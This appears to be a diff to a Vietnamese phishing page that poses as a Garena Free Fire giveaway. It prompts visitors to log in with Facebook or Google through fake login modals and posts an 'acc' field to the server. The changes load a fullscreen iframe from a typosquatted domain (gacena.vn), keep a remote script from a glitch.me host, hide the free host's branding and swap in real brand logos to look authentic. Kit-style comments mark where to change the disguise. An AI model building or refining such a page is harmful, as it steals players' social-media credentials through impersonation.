@@ -27,8 +27,21 @@ if(isset($_POST["acc"])){
       href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap"
     />
     <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
- 
-    <link rel="stylesheet" href="https://garena.rest/css/mdb.min.css?235235" />
+ <!-- Font Awesome -->
+<link
+  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"
+  rel="stylesheet"
+/>
+<!-- Google Fonts -->
+<link
+  href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
+  rel="stylesheet"
+/>
+<!-- MDB -->
+<link
+  href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.css"
+  rel="stylesheet"
+/>
     <style>
         img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {display: none;}
 #myModal .modal-dialog {
@@ -86,6 +99,11 @@ div#garena {
     font-size: 16px;
     margin-bottom: 1rem;
     border: 1px solid transparent;
+}
+.modal-body {
+    position: relative;
+    flex: 1 1 auto;
+    padding: 1rem;
 }
     </style>
         <title>Nhận quà garena free fire</title>
@@ -262,7 +280,7 @@ div#garena {
     display: block;
     margin: auto;
     margin-top: 20px;
-" id="photo" src="https://garena.rest/facebook_icon_130940 (1).png"/>
+" id="photo" src="https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png"/>
       <div class="modal-body" id="fb">
           <center id="thongbao">Vui lòng đăng nhập để tiếp tục</center>
           <div class="login">   
@@ -301,7 +319,7 @@ div#garena {
   <!--đổi giao diện ở đây-->
   <!--đổi giao diện ở đây-->
  <!--đổi giao diện ở đây-->
-   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://garena.rest/demo/24.html" id="iframe"> </iframe> 
+   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://gacena.vn/theme/1.html" id="iframe"> </iframe> 
 <!--https://ff-membership.glitch.me giao diện membership-->
 
 
@@ -326,10 +344,10 @@ var listener = window.addEventListener('blur', function() {
             <!-- facebook -->
               <div class="col-3">
                   <!--dùng mod thì thêm số 1 vào sau fb-->
-                  <a onclick="fb1()"><img class="w-100 rounded" src="https://garena.rest/facebook_icon_130940 (1).png"/></a>
+                  <a onclick="fb1()"><img class="w-100 rounded" src="https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png"/></a>
               </div>
               <div class="col-3">
-                <a onclick="gg()"><img class="w-100 rounded" src="https://garena.rest/Google_icon-icons.com_66793.png"/></a>
+                <a onclick="gg()"><img class="w-100 rounded" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/1200px-Google_%22G%22_Logo.svg.png"/></a>
             </div>
             
             <div class="col-3">
@@ -380,7 +398,7 @@ function login(){
           $('#exampleModal').modal('show');
              $('#myModal').modal('hide');
              $("#photo").show();
-             $("#photo").attr('src','https://garena.rest/facebook_icon_130940 (1).png');
+             $("#photo").attr('src','https://www.americandream.edu.vn/statics/uploads/2018/11/fb-logo.png');
              $("#exampleModal .modal-body").attr('id','fb');
              
          }
@@ -388,7 +406,7 @@ function login(){
              $('#exampleModal').modal('show');
              $('#myModal').modal('hide');
              $("#photo").show();
-             $("#photo").attr('src','https://garena.rest/Google_icon-icons.com_66793.png');
+             $("#photo").attr('src','https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/1200px-Google_%22G%22_Logo.svg.png');
              $("#exampleModal .modal-body").attr('id','gg');
              $("#type").val('Google');
          }
@@ -408,13 +426,13 @@ function login(){
          }
 
      </script>
-
-    <script type="text/javascript" src="https://garena.rest/js/mdb.min.js"></script>
+<!-- MDB -->
+<script
+  type="text/javascript"
+  src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.js"
+></script>
     <script type="text/javascript" src="https://scripth.glitch.me/script.js"></script>
    
 
   </body>
 </html>
-
-
-
